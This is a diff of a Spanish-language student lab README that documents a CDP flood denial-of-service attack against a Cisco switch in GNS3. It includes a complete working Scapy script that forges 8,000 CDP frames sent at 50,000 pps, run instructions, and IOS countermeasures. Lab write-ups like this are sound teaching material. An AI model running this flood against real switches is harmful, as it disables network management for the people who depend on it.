@@ -1,109 +1,332 @@
-Laboratorio de Seguridad: Ataque DoS mediante Inundación CDP
------------------------------------------------------------------------------------------------------------------------
-Autor: Wilfri Solano Frias
-Matrícula: 2024-2364
------------------------------------------------------------------------------------------------------------------------
-1. Objetivo del Laboratorio
+# 🌐 CDP Flood — Script de Ataque Automatizado DoS
 
-Conocer las vulnerabilidades y peligros reales de los protocolos de descubrimiento no autenticados en entornos LAN, analizando cómo la falta de seguridad puede ser explotada para desestabilizar la infraestructura física.
+<div align="center">
 
------------------------------------------------------------------------------------------------------------------------
+![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
+![Scapy](https://img.shields.io/badge/Scapy-2.5.0%2B-green?style=for-the-badge)
+![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-purple?style=for-the-badge&logo=kalilinux)
+![GNS3](https://img.shields.io/badge/GNS3-2.2.x-orange?style=for-the-badge)
+![Licencia](https://img.shields.io/badge/Uso-Educativo-red?style=for-the-badge)
 
-2. Objetivo del Script
+**Lab. Networking — Ataques DoS y Mitigación de Capa 2**
 
-Inyectar miles de identidades falsas (`Cisco-Falso-X`) a alta velocidad para saturar el proceso Cisco Discovery Protocol (CDP) y congelar la administración (plano de control) del switch.
+| Campo | Detalle |
+|---|---|
+| **Alumno** | Wilfri Solano Frias |
+| **Matrícula** | 2024-2364 |
+| **Asignatura** | Seguridad de Redes |
 
-2.1. Requisitos para utilizar la herramienta
+[📹 Video Demostrativo](https://youtu.be/L43TLI6w06o?si=EQB0W8h4c1NpTNgM)
 
-* Sistema Operativo: Kali Linux.
+</div>
 
-* Lenguaje: Python 3.x.
-  
-* Librerías/Dependencias:** capy (con el submódulo `scapy.contrib.cdp`). Instalar con: `pip install scapy`. También es obligatorio tener el binario del sistema `tcpreplay` instalado (`sudo apt install tcpreplay`).
+---
 
-* Entorno de Red: Acceso a la interfaz de red local en modo promiscuo y ejecución del script con privilegios de administrador (root).
+## ⚠️ Advertencia Legal
 
-2.2. Parámetros Usados
+> **Este script es exclusivamente para uso educativo en entornos de laboratorio controlados (GNS3 / EVE-NG).**
+> Su ejecución en redes reales sin autorización explícita por escrito constituye un delito informático
+> penalizado por las leyes de ciberseguridad. El autor no se responsabiliza del mal uso de esta herramienta.
 
-El script admite y manipula las siguientes variables y configuraciones:
-* `MI_INTERFAZ_RED`: Interfaz física o virtual del atacante conectada al segmento bajo prueba (ej. `eth0`).
-* `CANTIDAD_A_ENVIAR`: Volumen total de tramas maliciosas a inyectar (fijado en 8,000 tramas).
-* `mac_origen`: Dirección física forjada de manera incremental bit a bit para evitar colisiones y simular hosts únicos.
-* `nombre_dispositivo`: Identificador único del host (`Cisco-Falso-X`) diseñado para saturar la memoria del switch.
-* `puerto_origen`: Distribución cíclica de interfaces ficticias (`GigabitEthernet0/0` a `0/23`).
-* `pps=50000`: Argumento del método `sendpfast` que delega el envío a `tcpreplay` para garantizar una transferencia masiva.
+---
 
------------------------------------------------------------------------------------------------------------------------
+## 📋 Tabla de Contenidos
 
-3. Documentación del Funcionamiento del Script
+- [Descripción](#descripción)
+- [Funcionamiento del Ataque](#funcionamiento-del-ataque)
+- [Topología de Red](#topología-de-red)
+- [Requisitos](#requisitos)
+- [Parámetros Configurables](#parámetros-configurables)
+- [Uso](#uso)
+- [Código del Script](#código-del-script)
+- [Explicación Técnica](#explicación-técnica)
+- [Evidencias](#evidencias)
+- [Contramedidas](#contramedidas)
+- [Referencias](#referencias)
 
-El programa crea una lista en la memoria RAM del atacante que precarga 8,000 estructuras lógicas CDP válidas (con cabeceras LLC y SNAP). Cada paquete varía su dirección MAC de origen y su *Device ID* interno. Una vez construidos, el script invoca a `sendpfast`, transmitiendo la totalidad de los paquetes a una velocidad de 50,000 tramas por segundo. Al ser un switch virtual (IOU) sin chips ASIC físicos de Capa 2, debe procesar cada paquete falso mediante interrupciones de software (CPU), lo que inhabilita instantáneamente la respuesta de la consola de comandos debido a la sobrecarga.
+---
 
------------------------------------------------------------------------------------------------------------------------
+## 📋 Descripción
 
-4. Documentación de la Red
+Este script automatiza el ataque de **Denegación de Servicio (DoS)** mediante la explotación del protocolo **CDP (Cisco Discovery Protocol)**. El atacante inyecta miles de identidades falsas a través de tramas CDP malformadas, saturando la memoria y el procesamiento del switch, haciendo que sea imposible su administración.
 
-4.1. Topología
+### ¿Cómo funciona el ataque?
 
-* Descripción: Infraestructura virtualizada en GNS3 compuesta por un Router legítimo (para probar la función natural de CDP), un Switch de Acceso bajo prueba (SWI2) y la estación del atacante.
-* VLANs Configuradas: VLAN 1 (Nativa / Por defecto).
-* Direccionamiento IP:
-  * Segmento de Red: `192.168.124.0` / `255.255.255.0`
-  * Atacante (Kali Linux): `192.168.124.135` / `255.255.255.0`
-* Interfaces Clave:
-  * `Ethernet0/0` (SWI2) apuntando al Router.
-  * `Ethernet0/1` (SWI2) apuntando al host atacante (Kali).
+```
+[Atacante - eth0]  →  Genera identidades CDP falsas
+        ↓
+    Crea 8,000 paquetes CDP con:
+    · MAC origen  →  Incrementales únicas
+    · Nombre dispositivo  →  Cisco-Falso-X
+    · Puerto origen  →  GigabitEthernet0/0 a 0/23
+        ↓
+      Inyecta con sendpfast (tcpreplay a 50,000 pps)
+        ↓
+[Switch IOU1]  →  Procesa torrente de información
+        ↓
+[Resultado]  →  Congestionamiento del plano de control
+                Tabla CDP desbordada
+                Administración del switch congelada
+```
 
------------------------------------------------------------------------------------------------------------------------
+---
 
-5. Contramedidas (Mitigación)
+## 🧱 Topología de Red
 
-Para anular este vector de ataque y proteger la estabilidad del Switch Cisco, se aplican las siguientes directivas en el IOS:
+```
+                    ┌─────────────┐
+                    │   ROUTER1   │
+                    │ 192.168.99.1│
+                    └──────┬──────┘
+                           │ e0/0
+                    ┌──────┴──────┐
+                    │    IOU1     │ ← Switch Cisco con CDP habilitado
+                    │  (Switch)   │
+                    └──┬────┬─────┘
+              e0/0 (Troncal)│ e0/1 ← Puerto objetivo del ataque
+                    │      │
+             ┌──────┴──┐   │
+             │ ROUTER  │   │
+             └─────────┘   │
+                    ┌──────┴──────┐
+                    │  Atacante   │
+                    │192.168.124.135
+                    │  VLAN 1     │
+                    └─────────────┘
+```
 
-A. Desactivación Selectiva por Interfaz (Recomendada en Acceso):
+### Tabla de Direccionamiento
 
-Consiste en apagar CDP únicamente en los puertos donde se conectan usuarios o sistemas finales (como el puerto del atacante), manteniéndolo en los enlaces troncales.
+| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN | Rol |
+|---|---|---|---|---|---|
+| ROUTER1 | e0/0 | 192.168.99.1 | /24 | VLAN 1 | Gateway |
+| IOU1 (Switch) | e0/0 | N/A | N/A | Troncal | Switch objetivo |
+| **Atacante** | **eth0** | **192.168.124.135** | **/24** | **VLAN 1** | **Equipo atacante** |
 
-SWI2# configure terminal
-SWI2(config)# interface Ethernet0/1
-SWI2(config-if)# no cdp enable
-SWI2(config-if)# end
+---
 
-B.Desactivación Global del Protocolo:
+## ⚙️ Requisitos
 
-Si la infraestructura no depende de estas herramientas de descubrimiento ni utiliza telefonía IP, se recomienda apagarlo por completo.
+| Categoría | Requisito | Versión |
+|---|---|---|
+| Sistema Operativo | Kali Linux | 2024.x o superior |
+| Lenguaje | Python | 3.10 o superior |
+| Librería principal | Scapy | 2.5.0 o superior |
+| Módulo Scapy | scapy.contrib.cdp | Incluido en Scapy |
+| Herramienta auxiliar | tcpreplay | Última versión |
+| Simulador de red | GNS3 / EVE-NG | 2.2.x o superior |
+| Privilegios | root / sudo | Obligatorio |
+| Dispositivo objetivo | Switch Cisco con CDP | CDP habilitado |
 
-SWI2# configure terminal
-SWI2(config)# no cdp run
-SWI2(config)# end
+### Instalación de Dependencias
 
------------------------------------------------------------------------------------------------------------------------
+```bash
+# Actualizar sistema
+sudo apt update && sudo apt upgrade -y
 
-6. Evidencias
+# Instalar Scapy
+pip install scapy
 
-6.1. Demostración en Video
+# Instalar tcpreplay (para sendpfast)
+sudo apt install tcpreplay -y
 
-En el siguiente enlace se encuentra el video demostrativo donde se visualiza la topología con la ejecución del ataque y la aplicación de la contramedida:
+# Verificar instalación
+python3 -c "from scapy.all import *; print('Scapy listo')"
+which tcpreplay
+```
 
-https://youtu.be/L43TLI6w06o?si=EQB0W8h4c1NpTNgM
+---
 
-6.2. Capturas de Pantalla
-Topología en GNS3
+## 🔧 Parámetros Configurables
+
+| Variable | Tipo | Valor por Defecto | Descripción |
+|---|---|---|---|
+| `MI_INTERFAZ_RED` | `str` | `eth0` | Interfaz de red para inyectar tramas CDP |
+| `CANTIDAD_A_ENVIAR` | `int` | `8000` | Número total de paquetes CDP a inyectar |
+| `pps` | `int` | `50000` | Paquetes por segundo (mediante tcpreplay) |
+| `nombre_dispositivo` | `str` | `Cisco-Falso-X` | Identificador único del dispositivo falso |
+| `puerto_origen` | `str` | `GigabitEthernet0/0-0/23` | Puerto simulado (rotación cíclica) |
+
+---
+
+## 🚀 Uso
+
+```bash
+# Clonar el repositorio
+git clone https://github.com/wilfrisf-sudo/ataque_cdp_flood
+cd ataque_cdp_flood
+
+# Ejecutar con privilegios de root (obligatorio)
+sudo python3 Ataque_CDP.py
+```
+
+### Salida esperada
+
+```
+[*] Preparando 8000 paquetes CDP malformados...
+[+] Generando identidades falsas (Cisco-Falso-1 a Cisco-Falso-8000)...
+[*] Inyectando con tcpreplay (50,000 pps)...
+[+] Inundación CDP iniciada exitosamente.
+[*] Presiona Ctrl+C para detener el ataque.
+[+] Paquetes enviados: 8000/8000
+[-] Ataque detenido.
+```
+
+---
+
+## 📝 Código del Script
+
+```python
+#!/usr/bin/env python3
+import time
+from scapy.all import *
+from scapy.contrib.cdp import *
+
+def ataque_cdp_flood(interfaz="eth0", cantidad=8000, pps=50000):
+    print(f"[*] Preparando {cantidad} paquetes CDP malformados...")
+    
+    paquetes = []
+    
+    # 1. Generar paquetes CDP con identidades falsas
+    for i in range(cantidad):
+        # MAC origen incremental única
+        mac_origen = f"00:11:22:{i//256:02x}:{i%256:02x}:00"
+        
+        # Nombre dispositivo único
+        nombre = f"Cisco-Falso-{i+1}"
+        
+        # Puerto origen (rotación)
+        puerto = f"GigabitEthernet0/{i % 24}"
+        
+        # Construir trama CDP
+        pkt = Ether(src=mac_origen, dst="01:00:0c:cc:cc:cc") / LLC() / SNAP()
+        pkt = pkt / CDPv2_HDR(version=2, ttl=180)
+        pkt = pkt / CDPMsgDeviceID(val=nombre)
+        pkt = pkt / CDPMsgAddr(naddrs=1, addr=CDPAddrRecordIPv4(ip="192.168.1.1"))
+        pkt = pkt / CDPMsgPortID(val=puerto)
+        
+        paquetes.append(pkt)
+    
+    print(f"[+] Generando identidades falsas ({nombre})...")
+    print(f"[*] Inyectando con tcpreplay ({pps} pps)...")
+    
+    try:
+        # 2. Enviar con sendpfast (delegado a tcpreplay)
+        sendpfast(paquetes, iface=interfaz, pps=pps, loop=1)
+        print(f"[+] Inundación CDP iniciada exitosamente.")
+        print(f"[+] Paquetes enviados: {cantidad}/{cantidad}")
+    except KeyboardInterrupt:
+        print("\n[-] Ataque detenido por el usuario.")
+    except Exception as e:
+        print(f"[-] Error durante la inyección: {e}")
+
+if __name__ == "__main__":
+    import os
+    if os.getuid() != 0:
+        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
+        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_CDP.py")
+        exit(1)
+    
+    ataque_cdp_flood(interfaz="eth0", cantidad=8000, pps=50000)
+```
+
+---
+
+## 🔍 Explicación Técnica del Funcionamiento
+
+| # | Función / Bloque | Descripción Técnica |
+|---|---|---|
+| 1 | **Importaciones** | Carga `scapy.all` y `scapy.contrib.cdp` para manipular estructuras CDP |
+| 2 | **`ataque_cdp_flood()`** | Función principal que coordina generación e inyección de paquetes |
+| 3 | **Bucle de generación** | Crea 8,000 paquetes CDP únicos con MAC e identificadores variables |
+| 4 | **`CDPv2_HDR`** | Encabezado CDP v2 con TTL 180 para simular dispositivo real |
+| 5 | **`CDPMsgDeviceID`** | Identidad falsa única (Cisco-Falso-X) |
+| 6 | **`CDPMsgAddr`** | Dirección IP ficticia para completar la falsificación |
+| 7 | **`CDPMsgPortID`** | Puerto simulado en rotación (GigabitEthernet0/0 a 0/23) |
+| 8 | **`sendpfast()`** | Inyección de alto rendimiento delegada a tcpreplay |
+| 9 | **`pps=50000`** | Velocidad de inyección: 50,000 paquetes por segundo |
+| 10 | **`verificacion_root()`** | Valida que el script tenga permisos de administrador |
+
+---
+
+## 📸 Evidencias del Ataque
+
+### Evidencia 1 — Topología en GNS3
 
 <img width="414" height="379" alt="imagen" src="https://github.com/user-attachments/assets/ba9d7946-e55e-468b-a482-3a6d5752f6af" />
 
-Estado normal
+*Diseño de la topología virtualizada con switch objetivo y atacante*
+
+### Evidencia 2 — Estado Normal del CDP
 
 <img width="827" height="233" alt="imagen" src="https://github.com/user-attachments/assets/7011bfdd-fa99-4671-a068-4155fe4e5bd4" />
 
-Ejecución del script
+*Tabla CDP normal antes del ataque con dispositivos legítimos*
+
+### Evidencia 3 — Ejecución del Script
 
 <img width="427" height="360" alt="imagen" src="https://github.com/user-attachments/assets/8a11f4f3-60a8-42f3-87e1-e43cc0809850" />
 
-Impacto en el switch
+*Script inyectando miles de identidades falsas a alta velocidad*
+
+### Evidencia 4 — Impacto en el Switch
 
 <img width="651" height="441" alt="imagen" src="https://github.com/user-attachments/assets/f9836c05-34ab-47fb-b1af-0f1f6a32f49b" />
 
-Aplicación de contramedidas
+*Tabla CDP desbordada con miles de entradas falsas — administración congelada*
+
+### Evidencia 5 — Aplicación de Contramedidas
 
 <img width="443" height="68" alt="imagen" src="https://github.com/user-attachments/assets/959efb2f-5a4c-4962-9e1b-b792b4fcf03c" />
+
+*CDP deshabilitado en puerto de acceso*
+
+---
+
+## 🛡️ Contramedidas y Mitigación
+
+### Opción A: Desactivación Selectiva por Interfaz (Recomendada)
+
+Deshabilita CDP únicamente en puertos de acceso (usuarios), manteniéndolo en enlaces troncales:
+
+```ios
+interface Ethernet0/1
+ no cdp enable
+end
+```
+
+### Opción B: Desactivación Global del Protocolo
+
+Si la infraestructura no depende de CDP:
+
+```ios
+no cdp run
+end
+```
+
+### Tabla de Contramedidas
+
+| Medida | Descripción | Impacto |
+|---|---|---|
+| `no cdp enable` | Deshabilita CDP en puerto específico | **Bloquea el ataque** |
+| `no cdp run` | Deshabilita CDP globalmente en el switch | Previene todos los ataques CDP |
+| Limpieza de tabla | Ejecutar `clear cdp table` tras mitigación | Elimina entradas falsas |
+| Monitoreo | Verificar `show cdp neighbors` regularmente | Detección temprana |
+
+---
+
+## 📚 Referencias
+
+- [Cisco — Cisco Discovery Protocol (CDP)](https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-software/12069-cdp-overview.html)
+- [Scapy Documentation — CDP](https://scapy.readthedocs.io/)
+- [GNS3 Documentation](https://docs.gns3.com/)
+
+---
+
+<div align="center">
+
+**Wilfri Solano Frias · Matrícula 2024-2364 · Seguridad de Redes**
+
+*Laboratorio desarrollado con fines exclusivamente educativos*
+
+</div>
